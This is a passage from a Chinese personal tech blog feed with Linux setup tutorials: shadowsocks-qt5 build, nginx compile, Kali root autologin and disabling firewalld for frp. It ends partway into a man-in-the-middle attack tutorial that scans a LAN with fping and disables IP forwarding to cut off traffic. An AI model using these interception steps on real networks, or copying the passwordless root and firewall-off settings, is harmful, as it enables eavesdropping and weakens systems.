    <content type="html"><![CDATA[<p>很多人不想用linux系统作为主用系统，最大的原因就是软件方面的问题，上手难度有点高，不像windows那样拿来就用。像ubuntu20.04这种最新的系统就更折腾了，很多软件都还没适配，实在是令人抓狂。网络上常见有三种方法安装shadowsocks-qt5，我都试过了，只有我现在要说的这种方法有效。</p><a id="more"></a><h3 id="第一种：（失败）"><a href="#第一种：（失败）" class="headerlink" title="第一种：（失败）"></a>第一种：（失败）</h3><pre><code>sudo add-apt-repository ppa:hzwhuang/ss-qt5         未兼容，添加失败。sudo apt-get update sudo apt-get install shadowsocks-qt5</code></pre><h3 id="第二种：（乱码）"><a href="#第二种：（乱码）" class="headerlink" title="第二种：（乱码）"></a>第二种：（乱码）</h3><p><code>sudo snap install shadowsocks-qt5</code>         系统为中文的话，安装完后会乱码</p><h3 id="第三种：（可行）"><a href="#第三种：（可行）" class="headerlink" title="第三种：（可行）"></a>第三种：（可行）</h3><h4 id="第一步：准备文件"><a href="#第一步：准备文件" class="headerlink" title="第一步：准备文件"></a>第一步：准备文件</h4><p><code>sudo apt-get install synaptic</code>    安装新立德包管理器，后面用的上<br><code>sudo apt-get install cmake qtbase5-dev libqrencode-dev libzbar0 libappindicator1 libzbar-dev</code>    安装相关依赖。</p><p><code>git clone https://github.com/shadowsocks/shadowsocks-qt5</code>    下载shadowsocks-qt5<br><code>git clone https://github.com/shadowsocks/libQtShadowsocks</code>    下载libQtShadowsocks<br><code>wget https://botan.randombit.net/releases/Botan-2.9.0.tgz</code>        下载Botan，具体最新版本可去查看一下，目前最新版本是2.9.0</p><h4 id="第二步：要按顺序安装"><a href="#第二步：要按顺序安装" class="headerlink" title="第二步：要按顺序安装"></a>第二步：要按顺序安装</h4><p>先安装Botan：</p><pre><code>tar xvf Botan-2.9.0.tgzcd Botan-2.9.0./configure.pymake -j4sudo make installsudo ldconfig</code></pre><p>再安装libQtShadowsocks ：</p><pre><code>cd libQtShadowsocks mkdir build &amp;&amp; cd buildcmake .. -DUSE_BOTAN2=ONmake -j4sudo make install</code></pre><p>最后安装shadowsocks-qt5：</p><pre><code>cd shadowsocks-qt5mkdir build &amp;&amp; cd buildcmake .. make -j4sudo make install</code></pre><p>安装完毕后，终端输入：ss-qt5  或者 点击图标来打开shadowsocks-qt5，如果能打开是最好的，我的就不能打开。<br>打不开的解决方法：<br>终端输入：<code>sudo apt install -f</code>    看看有没有缺失的依赖需要安装，如果没有就打开新立德包管理器，选择“推荐的软件包丢失“，刷新一下，这时候应该会出现一些包需要安装，右键选择“标记以便安装“，点击“应用“，安装完后应该就能打开了，我尝试了两次都能安装成功，如果你的不能成功就要找找原因了。或许步骤没做对，或者系统不兼容。</p><p>支持chacha20-ietf-poly1305协议</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;很多人不想用linux系统作为主用系统，最大的原因就是软件方面的问题，上手难度有点高，不像windows那样拿来就用。像ubuntu20.04这种最新的系统就更折腾了，很多软件都还没适配，实在是令人抓狂。网络上常见有三种方法安装shadowsocks-qt5，我都试过了，只有我现在要说的这种方法有效。&lt;/p&gt;
    
    </summary>
    
    
      <category term="教程" scheme="https://caijinbo.work/categories/%E6%95%99%E7%A8%8B/"/>
    
    
      <category term="ubuntu" scheme="https://caijinbo.work/tags/ubuntu/"/>
    
  </entry>
  
  <entry>
    <title>华为交换机常用查看指令</title>
    <link href="https://caijinbo.work/2020/04/30/%E5%8D%8E%E4%B8%BA%E4%BA%A4%E6%8D%A2%E6%9C%BA%E5%B8%B8%E7%94%A8%E6%9F%A5%E7%9C%8B%E6%8C%87%E4%BB%A4/"/>
    <id>https://caijinbo.work/2020/04/30/%E5%8D%8E%E4%B8%BA%E4%BA%A4%E6%8D%A2%E6%9C%BA%E5%B8%B8%E7%94%A8%E6%9F%A5%E7%9C%8B%E6%8C%87%E4%BB%A4/</id>
    <published>2020-04-30T16:00:00.000Z</published>
    <updated>2020-05-20T00:11:06.136Z</updated>
    
    <content type="html"><![CDATA[<p>display version，显示系统版本。</p><p>display clock [ utc ]，显示系统时钟。</p><p>display saved-configuration，显示起始配置信息。</p><p>display current-configuration，显示当前配置信息。</p><a id="more"></a><p>display this，显示当前视图的运行配置。</p><p>display user-interface  命令查看当前系统中的绝对编号。</p><p>display diagnostic-information [ file-name ]，显示系统诊断信息。</p><p>display users [ all ]命令显示用户界面的使用信息。</p><p>display user-interface console ui-number1 [ summary ]命令显示用户界面的物理属性和配置。</p><p>display local-user命令查看本地用户列表。</p><p>display access-user命令查看在线用户。</p><p>display users，可以查看当前用户界面的使用信息。</p><p>display ip interface [ brief ] [ interface-type [ interface-number ] ]命令查看接口的IP配置信息。</p><p>display interface [ interface-type [ interface-number ] ]命令查看接口的信息。</p><p>display interface brief 查看物理端口的物理状态</p><p>display arp all  查看整机所有单板ARP表项数量(已经去除重复的ARP表项)</p><p>display arp statistics all  该命令查询的是整机所有单板(主控板+接口板)的ARP表项数量</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;display version，显示系统版本。&lt;/p&gt;
&lt;p&gt;display clock [ utc ]，显示系统时钟。&lt;/p&gt;
&lt;p&gt;display saved-configuration，显示起始配置信息。&lt;/p&gt;
&lt;p&gt;display current-configuration，显示当前配置信息。&lt;/p&gt;
    
    </summary>
    
    
      <category term="教程" scheme="https://caijinbo.work/categories/%E6%95%99%E7%A8%8B/"/>
    
    
      <category term="教程" scheme="https://caijinbo.work/tags/%E6%95%99%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>kali linux系统设置root用户自动登录解决方法</title>
    <link href="https://caijinbo.work/2020/04/02/kali%20linux%E8%AE%BE%E7%BD%AEroot%E7%94%A8%E6%88%B7%E8%87%AA%E5%8A%A8%E7%99%BB%E5%BD%95%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/"/>
    <id>https://caijinbo.work/2020/04/02/kali%20linux%E8%AE%BE%E7%BD%AEroot%E7%94%A8%E6%88%B7%E8%87%AA%E5%8A%A8%E7%99%BB%E5%BD%95%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/</id>
    <published>2020-04-02T16:00:00.000Z</published>
    <updated>2020-05-20T00:11:06.128Z</updated>
    
    <content type="html"><![CDATA[<p>kali linux 2020版本其中有一个变动的地方就是不能再以root用户登录系统了，就是只能以普通用户身份登录，每次使用有很大的不方便，每次都要手动切换root用户，切换多了感觉就很繁琐，索性就设置默认以root用户登录，省事多了。当然在个人电脑才这么玩，如果是生产环境下的机器还是普通用户保险点。</p><a id="more"></a><h3 id="第一步：先给root用户设个密码"><a href="#第一步：先给root用户设个密码" class="headerlink" title="第一步：先给root用户设个密码"></a>第一步：先给root用户设个密码</h3><pre><code>$sudo passwd root输入密码：再次输入密码：</code></pre><h3 id="第二步："><a href="#第二步：" class="headerlink" title="第二步："></a>第二步：</h3><pre><code>sudo vim /etc/pam.d/gdm-autologin注释行 “auth requied pam_succeed_if.so user != root quiet success”</code></pre><pre><code>sudo vim /etc/pam.d/gdm-password注释行 “auth requied pam_succeed_if.so user != root quiet success”</code></pre><p><strong>到这一步便可以使用root用户登录了</strong></p><h3 id="第三步："><a href="#第三步：" class="headerlink" title="第三步："></a>第三步：</h3><pre><code>vim /etc/gdm3/daemon.conf</code></pre><pre><code>[daemon]# Uncomment the line below to force the login screen to use Xorg#WaylandEnable=false# Enabling automatic login  AutomaticLoginEnable = true    **#改成true**  AutomaticLogin = root         **#改成root**# Enabling timed login#  TimedLoginEnable = true#  TimedLogin = user1#  TimedLoginDelay = 10#AutomaticLoginEnable=False#AutomaticLogin=kali     **#注释掉普通用户**</code></pre><h3 id="第四步："><a href="#第四步：" class="headerlink" title="第四步："></a>第四步：</h3><pre><code>vim /etc/lightdm/lightdm.confautologin-user=root</code></pre><h3 id="第五步："><a href="#第五步：" class="headerlink" title="第五步："></a>第五步：</h3><p>重启系统：reboot</p><p><strong>开机之后便会自动以root用户登录系统了，密码都不用输，简直是懒癌的福音。</strong></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;kali linux 2020版本其中有一个变动的地方就是不能再以root用户登录系统了，就是只能以普通用户身份登录，每次使用有很大的不方便，每次都要手动切换root用户，切换多了感觉就很繁琐，索性就设置默认以root用户登录，省事多了。当然在个人电脑才这么玩，如果是生产环境下的机器还是普通用户保险点。&lt;/p&gt;
    
    </summary>
    
    
      <category term="教程" scheme="https://caijinbo.work/categories/%E6%95%99%E7%A8%8B/"/>
    
    
      <category term="教程" scheme="https://caijinbo.work/tags/%E6%95%99%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>centos系统设置笔记本盖下不休眠</title>
    <link href="https://caijinbo.work/2020/02/11/centos%E7%B3%BB%E7%BB%9F%E7%AC%94%E8%AE%B0%E6%9C%AC%E7%9B%96%E4%B8%8B%E4%B8%8D%E4%BC%91%E7%9C%A0/"/>
    <id>https://caijinbo.work/2020/02/11/centos%E7%B3%BB%E7%BB%9F%E7%AC%94%E8%AE%B0%E6%9C%AC%E7%9B%96%E4%B8%8B%E4%B8%8D%E4%BC%91%E7%9C%A0/</id>
    <published>2020-02-11T16:00:00.000Z</published>
    <updated>2020-05-20T00:11:06.124Z</updated>
    
    <content type="html"><![CDATA[<p>安装了centos8.1系统之后出现了一个问题，就是无论多久不使用电脑，屏幕一直都是亮着的，并不会自动息屏，以前安装centos7的时候是会自动息屏的。因为centos8笔记本是用来做服务器的，都是远程使用的，屏幕都是用不上的，屏幕一直亮着很是碍眼。所以要设置成盖下盖子而不会休眠。</p><p>通过网络查询，终于找到了设置的方法：</p><a id="more"></a><p>systemd 处理某些电源相关的 ACPI事件，可以通过从 /etc/system/logind.conf以下选项进行配置：</p><p>动作包括：</p><p>HandlePowerKey：按下电源键后的动作</p><p>HandleSleepKey：按下挂起键后的动作</p><p>HandleHibernateKey: 按下休眠键后的动作</p><p>HandleLidSwitch：合上笔记本盖后待机</p><p>这些动作的值可以是 ignore（什么都不做） poweroff（关机） reboot（重新启动） halt（关机，和poweroff有什么区别，需要手动断开电源？） suspend（待机挂起） hibernate（休眠） 默认情况是，当我合上笔记本屏幕的时候，系统会待机。</p><p>如果我不想让系统在我合上笔记本的时候待机，怎么办呢？</p><p>用vim编辑器打开 /etc/systemd/logind.conf 去掉HandleLidSwitch前面的注释符号#，并把它的值从suspend修改为ignore or lock。</p><p>lock 仅锁屏，计算机继续工作</p><p>然后systemctl restart systemd-logind，使更改生效。再合上笔记本盖子，也不会待机了。</p><p>如果再想进入待机状态，可执行systemctl suspend。</p><p>原文链接：<a href="https://blog.csdn.net/nankys/article/details/86617948" target="_blank" rel="noopener">https://blog.csdn.net/nankys/article/details/86617948</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;安装了centos8.1系统之后出现了一个问题，就是无论多久不使用电脑，屏幕一直都是亮着的，并不会自动息屏，以前安装centos7的时候是会自动息屏的。因为centos8笔记本是用来做服务器的，都是远程使用的，屏幕都是用不上的，屏幕一直亮着很是碍眼。所以要设置成盖下盖子而不会休眠。&lt;/p&gt;
&lt;p&gt;通过网络查询，终于找到了设置的方法：&lt;/p&gt;
    
    </summary>
    
    
      <category term="教程" scheme="https://caijinbo.work/categories/%E6%95%99%E7%A8%8B/"/>
    
    
      <category term="教程" scheme="https://caijinbo.work/tags/%E6%95%99%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>电脑中病毒</title>
    <link href="https://caijinbo.work/2020/02/11/%E7%94%B5%E8%84%91%E4%B8%AD%E7%97%85%E6%AF%92/"/>
    <id>https://caijinbo.work/2020/02/11/%E7%94%B5%E8%84%91%E4%B8%AD%E7%97%85%E6%AF%92/</id>
    <published>2020-02-11T16:00:00.000Z</published>
    <updated>2020-05-20T00:11:06.144Z</updated>
    
    <content type="html"><![CDATA[<p>今天遇到了一件有意思的事情，上班时我发现有一台工作电脑屏幕上弹出一个很大界面的广告，本来因为有很多电脑乱安装软件或者安装不规范，导致会安装了一些流氓软件或者捆绑了很多不必要的垃圾软件，从而产生弹广告这些见怪不怪的事情了。由于屏幕上运行着监控软件，这个界面很大的广告几乎完全挡住监控界面了。这时候我必须要去关闭它了，不然看不到监控界面了。关闭的时候我还在感慨：现在的流氓软件真是太猖狂了，搞个广告都喜欢弄个这么大的。平时看到的弹广告都是电脑桌面右下角那里弹个小小的广告界面。我当时还觉得有点新鲜，还想随手拍个照片留底一下，后面想了想貌似之前双十一的时候也看过不少这么大的广告界面了，就懒得的拍照了，随手就点击关闭按钮。</p><a id="more"></a><p>然而事情没有那么简单，过了不久又弹出了一样的广告出来，我心里有点不乐意了，心里暗暗骂道，太流氓了。我看到广告界面右上角有个倒三角符号，我就点击一下，弹出选择：一天内不弹出、一周内不弹出，永久不弹出。<br>我选择了永久不弹出，然后随手关闭了，之前遇到过一种广告，选择永久不弹出的话需要注册用户才行，现在这个广告不用注册就可以关闭了，对比一下还是挺良心的嘛，既然能够永久不弹出的话我就不去深究了，我本人是最痛恨流氓软件的，所以我的个人电脑上是看不到广告这个玩意的，我电脑上的软件都是精心挑选的。上班时我都是使用自己的个人电脑。</p><p>可事情还是没有那么的简单，过了不久广告又弹出来了，这下可激怒我了，虽然是工作上的电脑，但我也不能容忍流氓软件这么猖狂，我明明选择了永久不弹出，它还在不停的弹出，这就是挑衅，这就是真正意义上的耍流氓的软件，必须干掉它。</p><p>接下来好戏便开始了，我看了一下广告界面，看不出是哪个软件产生的广告，我关闭广告后，进入电脑桌面，发现桌面壁纸被删除了，只留下黑乎乎的电脑桌面背景和桌面上的图标，我心想这不正常，这电脑平时没什么人会用，不应该会有人设置这样的桌面背景。此时这个广告还在不停的弹出。我想看看最近是不是安装了什么新的流氓软件，我点击开始按钮，结果按了之后没有反应，这就更奇怪了，打开任务管理器，我一看，内存使用率达到99%，我仔细看看，没有看到占用内存高的进程，此时我就知道是中病毒了，病毒把进程隐藏了，有意思，这时候就需要安全软件登场了，电脑桌面按什么都没有反应，然后我看下任务栏有不显示程序的三角符号，如果这台电脑上有安全软件的话一定会自动开机运行的，我看了一下有个火绒的安全软件，这下可以扫描一下病毒了，结果点击了火绒之后没反应，反而火绒退出了，就这样消失在我的眼前，我心想，这火绒也太弱了吧，居然被病毒干掉了。</p><p>这时候只能重启系统了，按住ctrl+alt+del键，选择电源那里，选择重启，结果有个未知的程序跳出来阻止关机，没关系，这里选择仍然关机。系统开机之后，系统能正常运行了，虽然病毒会开机自动运行，但没那么快。我打开开始按钮搜索火绒，结果没有找到，原来火绒已经被这个病毒删掉了，这个病毒还是有两把刷子的。我就打开浏览器重新下载个火绒安装，我之所以还要下载火绒，是想看看火绒能不能解决这个病毒，毕竟我的个人电脑上也安装了火绒。在这里我要说一下，国内的安全软件我只用火绒，因为火绒真的干净，没有广告，体积小，我本来电脑是没有安装安全软件的，就用微软自带的安全软件。后面看到火绒这个软件，感觉挺良心的，就支持一下它，就安装了。不过我电脑到目前为止都没有中过任何病毒。言归正传，安装了火绒之后就开始进行安全扫描了，果不其然，很快就扫描出了两个木马病毒，我一看原来是金山的程序搞的，处理病毒之后，我立刻将电脑上跟金山有关的软件全部卸载了，并且对电脑进行深度安全检查，后面又扫描出16个危险文件，包括后门病毒。处理之后，我又对电脑进行安装补丁。</p><p>这是我第一次遇到电脑中病毒的事件，挺有意思的，以前我刚玩电脑时，我几乎把全世界的有名安全软件都装了一遍，但我电脑从来都没有中过毒，我后面就很少再安装安全软件了，本来只用微软自带的安全软件也足够了，可是发现，平时要玩一些破解软件时，破解程序都被微软自带的干掉了，有点不方便，就用火绒来替代自带的了。</p><p>说真的，一个企业做这种事情，感觉有点恶心。不过能写出病毒的人都是挺牛逼的。不说那么多了，我还有大把东西需要学习。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;今天遇到了一件有意思的事情，上班时我发现有一台工作电脑屏幕上弹出一个很大界面的广告，本来因为有很多电脑乱安装软件或者安装不规范，导致会安装了一些流氓软件或者捆绑了很多不必要的垃圾软件，从而产生弹广告这些见怪不怪的事情了。由于屏幕上运行着监控软件，这个界面很大的广告几乎完全挡住监控界面了。这时候我必须要去关闭它了，不然看不到监控界面了。关闭的时候我还在感慨：现在的流氓软件真是太猖狂了，搞个广告都喜欢弄个这么大的。平时看到的弹广告都是电脑桌面右下角那里弹个小小的广告界面。我当时还觉得有点新鲜，还想随手拍个照片留底一下，后面想了想貌似之前双十一的时候也看过不少这么大的广告界面了，就懒得的拍照了，随手就点击关闭按钮。&lt;/p&gt;
    
    </summary>
    
    
      <category term="随笔" scheme="https://caijinbo.work/categories/%E9%9A%8F%E7%AC%94/"/>
    
    
      <category term="随笔" scheme="https://caijinbo.work/tags/%E9%9A%8F%E7%AC%94/"/>
    
  </entry>
  
  <entry>
    <title>解决frp无法开机启动的问题</title>
    <link href="https://caijinbo.work/2020/02/01/%E8%A7%A3%E5%86%B3frp%E6%97%A0%E6%B3%95%E5%BC%80%E6%9C%BA%E5%90%AF%E5%8A%A8%E7%9A%84%E9%97%AE%E9%A2%98/"/>
    <id>https://caijinbo.work/2020/02/01/%E8%A7%A3%E5%86%B3frp%E6%97%A0%E6%B3%95%E5%BC%80%E6%9C%BA%E5%90%AF%E5%8A%A8%E7%9A%84%E9%97%AE%E9%A2%98/</id>
    <published>2020-02-01T16:00:00.000Z</published>
    <updated>2020-05-20T00:11:06.144Z</updated>
    
    <content type="html"><![CDATA[<p>由于现在疫情的情况，新年假期延长了，我的是二月十号才去上班，这段时间都是呆在家里，不是打游戏就是打桌球，好是枯燥的生活，最近我趁着无聊的时间，就把家里的笔记本重装了centos8.1的系统，之前是centos7.7的系统，主要我就是图个新而已，其实差别都不大。</p><a id="more"></a><p>安装了centos系统之后，必定紧接着就是安装配置frp，这样我才能在外地远程进去。但是我配置完后发现frp并不能开机启动，我很仔细的检查过配置文件frpc.ini的内容，还有 vim /lib/systemd/system/frpc.service<br>里面的内容，都是没有问题的，执行systemctl start frpc 也是可以正常启动。但就是每次重启系统后不能启动frp，让我好是迷惑啊。</p><p>其实有经验的朋友可能很轻易就能想到是防火墙的问题了，我后面开始排除故障原因的时候，就想到了这是新装的系统，防火墙firewalld是正常启动的，于是我就把firewalld关闭了，后面就正常了。我之所以关闭防火墙，而不选择在防火墙上开启相应的端口，主要是嫌麻烦，因为这是家里的一台普通电脑而已，没有重要的资料需要保护，讲白，就是用不上防火墙。所以就关闭一了百了。<br>在家时间长了，学习的欲望低了，好是颓废了，这样下去真的难受，心里感觉好不充实，假期这么长，用来学习是一件很好的事，可不知为什么，总是提不起学习的欲望。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;由于现在疫情的情况，新年假期延长了，我的是二月十号才去上班，这段时间都是呆在家里，不是打游戏就是打桌球，好是枯燥的生活，最近我趁着无聊的时间，就把家里的笔记本重装了centos8.1的系统，之前是centos7.7的系统，主要我就是图个新而已，其实差别都不大。&lt;/p&gt;
    
    </summary>
    
    
      <category term="随笔" scheme="https://caijinbo.work/categories/%E9%9A%8F%E7%AC%94/"/>
    
    
      <category term="随笔" scheme="https://caijinbo.work/tags/%E9%9A%8F%E7%AC%94/"/>
    
  </entry>
  
  <entry>
    <title>centos7编译安装nginx并设置开机启动</title>
    <link href="https://caijinbo.work/2020/01/12/centos7%E7%BC%96%E8%AF%91%E5%AE%89%E8%A3%85nginx%E5%B9%B6%E8%AE%BE%E7%BD%AE%E5%BC%80%E6%9C%BA%E5%90%AF%E5%8A%A8/"/>
    <id>https://caijinbo.work/2020/01/12/centos7%E7%BC%96%E8%AF%91%E5%AE%89%E8%A3%85nginx%E5%B9%B6%E8%AE%BE%E7%BD%AE%E5%BC%80%E6%9C%BA%E5%90%AF%E5%8A%A8/</id>
    <published>2020-01-12T16:00:00.000Z</published>
    <updated>2020-05-20T00:11:06.120Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Nginx的应用场景"><a href="#Nginx的应用场景" class="headerlink" title="Nginx的应用场景"></a>Nginx的应用场景</h2><p>(1).http服务器。Nginx是一个http服务可以独立提供http服务。可以做网页静态服务器。<br>(2).虚拟主机。可以实现在一台服务器虚拟出多个网站。例如个人网站使用的虚拟主机。<br>(3).反向代理，负载均衡。当网站的访问量达到一定程度后，单台服务器不能满足用户的请求时，需要用多台服务器集群可以使用nginx做反向代理。并且多台服务器可以平均分担负载，不会因为某台服务器负载高宕机而某台服务器闲置的情况。</p><a id="more"></a><h2 id="安装步骤"><a href="#安装步骤" class="headerlink" title="安装步骤"></a>安装步骤</h2><h3 id="1-检查并安装所需的依赖软件"><a href="#1-检查并安装所需的依赖软件" class="headerlink" title="1.检查并安装所需的依赖软件"></a>1.检查并安装所需的依赖软件</h3><p>(1).gcc:nginx编译依赖gcc环境<br>安装命令：<code>yum install gcc-c++</code></p><p>(2).pcre:(Perl Compatible Regular Expressions)是一个Perl库，包括perl兼容的正则表达式库。nginx的http模块使用pcre来解析正则表达式.<br>安装命令：<code>yum install -y pcre pcre-devel</code></p><p>(3).zlib：该库提供了很多种压缩和解压缩的方式，nginx使用zlib对http包的内容进行gzip。<br>安装命令：<code>yum install -y zlib zlib-devel</code></p><p>(4).openssl:一个强大的安全套接字层密码库，囊括主要的密码算法、常用的密钥和证书封装管理功能及SSL协议，并提供丰富的应用程序供测试或其它目的使用。nginx不仅支持http协议，还支持https（即在ssl协议上传输http）.<br>安装命令：<code>yum install -y openssl openssl-devel</code></p><h3 id="2-下载nginx源码包"><a href="#2-下载nginx源码包" class="headerlink" title="2.下载nginx源码包"></a>2.下载nginx源码包</h3><p>下载命令：<code>wget http://nginx.org/download/nginx-1.17.7.tar.gz</code></p><h3 id="3-解压缩源码包并进入"><a href="#3-解压缩源码包并进入" class="headerlink" title="3.解压缩源码包并进入"></a>3.解压缩源码包并进入</h3><p>(1).解压缩：<code>tar -zxvf nginx-1.17.7.tar.gz</code></p><p>(2).进入解压缩后文件夹：<code>cd nginx-1.17.7</code></p><h3 id="4-配置编译参数命令-可以使用-configure-–help查询详细参数"><a href="#4-配置编译参数命令-可以使用-configure-–help查询详细参数" class="headerlink" title="4.配置编译参数命令:(可以使用./configure –help查询详细参数)"></a>4.配置编译参数命令:(可以使用./configure –help查询详细参数)</h3><pre><code class="jboss-cli">./configure</code></pre><p>注：安装之前需要手动创建上面指定的nginx文件夹，即/var/temp、/var/temp/nginx、/var/run/nginx文件夹，否则启动时报错</p><h3 id="5-编译并安装"><a href="#5-编译并安装" class="headerlink" title="5.编译并安装"></a>5.编译并安装</h3><p>命令：<code>make &amp;&amp; make install</code><br>可以进入/usr/local/nginx查看文件是否存在conf、sbin、html文件夹，若存在则安装成功</p><h2 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h2><h3 id="1-启动nginx"><a href="#1-启动nginx" class="headerlink" title="1.启动nginx"></a>1.启动nginx</h3><p>(1).进入安装目录</p><pre><code class="bash">cd /usr/local/nginx/sbin/</code></pre><p>(2).启动</p><pre><code class="jboss-cli">./nginx</code></pre><p>(3).若报错：[emerg] open() “/var/run/nginx/nginx.pid” failed (2: No such file or directory)<br>需要查看下是不是在/var/run文件夹下不存在nginx文件夹，不存在则新建</p><p>(4).查看是否启动：<code>ps -ef  | grep nginx</code><br>如果有master和worker两个进程证明启动成功<br>注意：执行./nginx启动nginx，这里可以-c指定加载的nginx配置文件，如下：</p><pre><code class="stata">./nginx -c /usr/local/nginx/conf/nginx.conf</code></pre><p>如果不指定-c，nginx在启动时默认加载conf/nginx.conf文件，此文件的地址也可以在编译安装nginx时指定./configure的参数(–conf-path= 指向配置文件（nginx.conf）)</p><h3 id="2-停止nginx"><a href="#2-停止nginx" class="headerlink" title="2.停止nginx"></a>2.停止nginx</h3><p>(1).暴力kill(不推荐使用)</p><pre><code class="bash">kill -9 processId</code></pre><p>(2).快速停止</p><pre><code class="bash">cd /usr/local/nginx/sbin &amp;&amp; ./nginx -s stop</code></pre><p>此方式相当于先查出nginx进程id再使用kill命令强制杀掉进程</p><p>(3).完整停止(建议使用)</p><pre><code class="jboss-cli">cd /usr/local/nginx/sbin &amp;&amp; ./nginx -s quit</code></pre><p>此方式停止步骤是待nginx进程处理任务完毕进行停止。</p><h3 id="3-重启及重新加载配置"><a href="#3-重启及重新加载配置" class="headerlink" title="3.重启及重新加载配置"></a>3.重启及重新加载配置</h3><p>(1).先停止再启动（建议使用）</p><pre><code class="jboss-cli">./nginx -s quit &amp;&amp; ./nginx</code></pre><p>(2).重新加载配置文件</p><pre><code class="jboss-cli">./nginx -s reload</code></pre><h3 id="4-测试"><a href="#4-测试" class="headerlink" title="4.测试"></a>4.测试</h3><p>nginx安装成功，启动nginx,即可通过ip地址来访问nginx。（localhost或者127.0.0.1或者主机ip）</p><h2 id="Nginx设置开机启动"><a href="#Nginx设置开机启动" class="headerlink" title="Nginx设置开机启动"></a>Nginx设置开机启动</h2><h3 id="1-创建nginx-service文件"><a href="#1-创建nginx-service文件" class="headerlink" title="1.创建nginx.service文件"></a>1.创建nginx.service文件</h3><pre><code class="crystal">vim /usr/lib/systemd/system/nginx.service</code></pre><p>填入以下内容：</p><pre><code class="ini">[Unit]Description=nginx - high performance web serverAfter=nginx.service[Service]Type=forkingExecStart=/usr/local/nginx/sbin/nginx      # nginx的路径ExecReload=/usr/local/nginx/sbin/nginx -s reloadExecStop=/usr/local/nginx/sbin/nginx -s stopExecenable=/usr/local/nginx/sbin/nginx[Install]WantedBy=multi-user.target</code></pre><p>重启一下systemctl</p><pre><code class="ebnf">systemctl daemon-reload</code></pre><h3 id="2、修改脚本权限"><a href="#2、修改脚本权限" class="headerlink" title="2、修改脚本权限"></a>2、修改脚本权限</h3><pre><code class="crystal">chmod 754 /usr/lib/systemd/system/nginx.service   </code></pre><h3 id="3、设置为开启及开机自启动"><a href="#3、设置为开启及开机自启动" class="headerlink" title="3、设置为开启及开机自启动"></a>3、设置为开启及开机自启动</h3><pre><code class="stylus">systemctl start nginx.servicesystemctl status nginx.servicesystemctl enable nginx.service</code></pre>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Nginx的应用场景&quot;&gt;&lt;a href=&quot;#Nginx的应用场景&quot; class=&quot;headerlink&quot; title=&quot;Nginx的应用场景&quot;&gt;&lt;/a&gt;Nginx的应用场景&lt;/h2&gt;&lt;p&gt;(1).http服务器。Nginx是一个http服务可以独立提供http服务。可以做网页静态服务器。&lt;br&gt;(2).虚拟主机。可以实现在一台服务器虚拟出多个网站。例如个人网站使用的虚拟主机。&lt;br&gt;(3).反向代理，负载均衡。当网站的访问量达到一定程度后，单台服务器不能满足用户的请求时，需要用多台服务器集群可以使用nginx做反向代理。并且多台服务器可以平均分担负载，不会因为某台服务器负载高宕机而某台服务器闲置的情况。&lt;/p&gt;
    
    </summary>
    
    
      <category term="教程" scheme="https://caijinbo.work/categories/%E6%95%99%E7%A8%8B/"/>
    
    
      <category term="教程" scheme="https://caijinbo.work/tags/%E6%95%99%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>中间人攻击</title>
    <link href="https://caijinbo.work/2019/12/31/%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/"/>
    <id>https://caijinbo.work/2019/12/31/%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/</id>
    <published>2019-12-31T16:00:00.000Z</published>
    <updated>2020-05-20T00:11:06.136Z</updated>
    
    <content type="html"><![CDATA[<h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>中间人攻击（Man-in-the-MiddleAttack，简称“MITM攻击”）是一种“间接”的入侵攻击，这种攻击模式是通过各种技术手段将受入侵者控制的一台计算机虚拟放置在网络连接中的两台通信计算机之间，这台计算机就称为“中间人”。</p><a id="more"></a><p>中间人攻击（Man-in-the-Middle Attack, MITM）是一种由来已久的网络入侵手段，并且当今仍然有着广泛的发展空间，如SMB会话劫持、DNS欺骗等攻击都是典型的MITM攻击。简而言之，所谓的MITM攻击就是通过拦截正常的网络通信数据，并进行数据篡改和嗅探，而通信的双方却毫不知情。<br>随着计算机通信网技术的不断发展，MITM攻击也越来越多样化。最初，攻击者只要将网卡设为混杂模式，伪装成代理服务器监听特定的流量就可以实现攻击，这是因为很多通信协议都是以明文来进行传输的，如HTTP、FTP、Telnet等。后来，随着交换机代替集线器，简单的嗅探攻击已经不能成功，必须先进行ARP欺骗才行。如今，越来越多的服务商（网上银行，邮箱登陆）开始采用加密通信，SSL(Secure Sockets Layer 安全套接层)是一种广泛使用的技术，HTTPS、FTPS等都是建立在其基础上的。</p><h2 id="工具与条件"><a href="#工具与条件" class="headerlink" title="工具与条件"></a>工具与条件</h2><p>1.kali系统（本次实验系统）<br>2.局域网内<br>3.本次实验只是普通的中间人攻击，纯属娱乐一下</p><h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><h3 id="第一步：扫描网段内存活的主机"><a href="#第一步：扫描网段内存活的主机" class="headerlink" title="第一步：扫描网段内存活的主机"></a>第一步：扫描网段内存活的主机</h3><pre><code>fping -g -r 0 -s 192.168.1.0/24 | grep alive</code></pre><p><img src="https://img-blog.csdnimg.cn/20200101141955682.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzkxODEyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="第二步：查看ip-forward的状态"><a href="#第二步：查看ip-forward的状态" class="headerlink" title="第二步：查看ip_forward的状态"></a>第二步：查看ip_forward的状态</h3><pre><code>cat /proc/sys/net/ipv4/ip_forward</code></pre><p>默认是0<br>如果不是0，则修改成0，0代表不转发流量，1代表转发流量。</p><pre><code>echo 0 &gt; /proc/sys/net/ipv4/ip_forward</code></pre><h3 